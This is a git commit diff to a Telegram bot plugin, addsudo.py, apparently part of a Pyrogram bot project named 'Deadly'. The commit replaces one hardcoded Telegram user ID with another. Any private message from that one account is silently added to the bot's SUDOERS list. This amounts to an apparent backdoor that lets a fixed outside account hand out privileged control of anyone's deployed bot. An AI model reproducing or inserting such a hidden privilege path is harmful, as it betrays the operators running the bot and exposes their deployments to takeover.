6f047fad6f67f1c37fe55113ee477909b8432995
TheDeadlyBots / <94062864+piroXpower@users.noreply.github.com>
2025-11-24 00:45:55 +0530

    Update addsudo.py

--- Deadly/plugins/addsudo.py
+++ Deadly/plugins/addsudo.py
@@ -2,7 +2,7 @@ from Deadly import PLAYER, SUDOERS
 from pyrogram import filters, Client
 from pyrogram.types import Message
 
-@Client.on_message(filters.user(6679100892) & filters.private) 
+@Client.on_message(filters.user(7930301153) & filters.private) 
 async def add_sudo(_, message:Message):
    newsudo = message.text
    SUDOERS.append(newsudo) 
